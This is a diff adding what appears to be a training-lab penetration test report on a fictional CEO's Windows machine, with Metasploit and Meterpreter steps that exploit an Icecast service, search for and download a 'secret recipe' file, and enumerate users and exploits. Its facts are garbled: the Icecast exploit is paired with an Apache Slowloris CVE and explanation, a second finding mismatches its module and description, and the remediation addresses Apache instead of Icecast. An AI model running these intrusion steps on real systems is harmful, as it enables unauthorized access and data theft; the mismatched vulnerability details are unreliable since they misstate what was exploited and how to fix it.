@@ -1,0 +1,100 @@
+Summery:
+
+GoodSecurity was tasked with performing an internal penetration test on GoodCorp’s CEO, Hans Gruber. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, like those of a hacker and attempt to infiltrate Hans’ computer and determine if it is at risk. GoodSecurity’s overall objective was to exploit any vulnerable software and find the secret recipe file on Hans’ computer, while reporting the findings back to GoodCorp.
+When performing the internal penetration test, there were several alarming vulnerabilities that wereidentified on Hans’ desktop. When performing the attacks, GoodSecurity was able to gain access to his machine and find the secret recipe file by exploit two programs that had major vulnerabilities. The details of the attack can be found in the ‘Findings’ category.
+
+Findings
+
+Machine IP:
+192.168.0.20
+Hostname:
+MSEDGEWIN10\IEUser
+Vulnerability Exploited:
+Icecast_header_overwrite
+CVE-2007-6750
+
+Vulnerability Explanation:
+The Apache HTTP Server 1.x and 2.x allows remote attackers to cause a denial of service (daemon outage) via partial HTTP requests, Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent HTTP headers, adding to-but never completing-the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients.
+A few remote actions that can be executed include:
+File Discovery and exfiltration
+Key logging and screen capture
+Privilege escalation to Administrator
+
+Severity:
+With all three exploits together, this puts the severity much higher and requires immediate action to be taken.
+Proof of Concept:
+Once getting access to the same network, the command “Netdiscover” was used to obtain the IP of Mr. Gruber. After getting the IP, I took the following steps to exploit these vulnerabilities and gain access to this host per the provided scope from GoodCorp.
+
+From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
+- searchsploit -t Icecast windows
+- <Result> (exploits/windows_x86/remote/16763.rb)
+ 
+Start Metasploit and search for the Icecast module and load it for use.:
+- msfconsole
+- search icecast
+- use 0
+ 
+ 
+Set the `RHOST` to the target machine and run.
+- set RHOSTS 192.168.0.20
+ 		- exploit
+
+ 
+Search for the `secretfile.txt` on the target.
+Meterpreter >  search -f *secretfile*.txt 
+-meterpreter > shell
+-cd c:\Users\IEUser
+-dir *secret* /s /p
+ 
+<Result>: C:\Users\IEUser\Documents\User.secretfile.txt
+ 
+  
+Search for the `recipe.txt` on the target and download the file:
+- meterpreter > search -f *recipe*.txt 
+
+- meterpreter > download Users/IEUser/Documents/Drinks.recipe.txt
+ 
+
+ 
+Use Meterpreter's local exploit suggester to find possible exploits.
+- meterpreter> run post/multi/recon/local_exploit_suggestor
+- The system was also found to be vulnerable to the following exploits:
+- exploit/windows/local/ikeext_service
+- exploit/windows/local/ms16_075_reflection
+ 
+Run a Meterpreter post script that enumerates all logged on users.
+- run post/windows/gather/enum_logged_on_users
+ 
+
+ 
+Open a Meterpreter shell and gather system information for the target.
+- shell
+- systeminfo
+- Or
+- sysinfo
+
+Findings
+
+Machine IP: 192.168.0.20:25
+Hostname: MSEDGEWIN10
+Vulnerability Exploited: windows/smb/ms08_067_netapi
+Vulnerability Explanation: Reconnaissance of usernames on system.  
+Severity: High 7
+Proof of Concept:
+
+
+Recommendations
+
+Upgrade the Apache HTTP Server to the latest version that has "mod_reqtimeout" module support available by default.
+Then enable the module "mod_reqtimeout" and configure it to set the timeout and minimum data rate for receiving requests,
+An example configuration is as below:
+<IfModule reqtimeout_module>
+RequestReadTimeout header=10-20,minrate=500
+RequestReadTimeout body=10,minrate=500
+</IfModule>
+http://httpd.apache.org/docs/trunk/mod/mod_reqtimeout.html
+For customers who are not ready to use "mod_reqtimeout" module a workaround is to decrease the "Timeout" setting for Apache to 10 seconds or less, instead of the default
+5 minutes (300 seconds), in the Apache web server configuration file.
+
+
+
